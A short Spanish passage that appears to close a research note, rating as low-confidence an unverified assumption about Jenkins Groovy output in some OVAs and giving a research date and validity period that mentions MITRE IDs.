- Output concreto Jenkins Groovy en las OVAs: LOW — [ASSUMED], requiere verificación con las OVAs

**Fecha de investigación:** 2026-05-24
**Válido hasta:** 2026-07-01 (IDs MITRE son estables; contenido del post base no cambia)
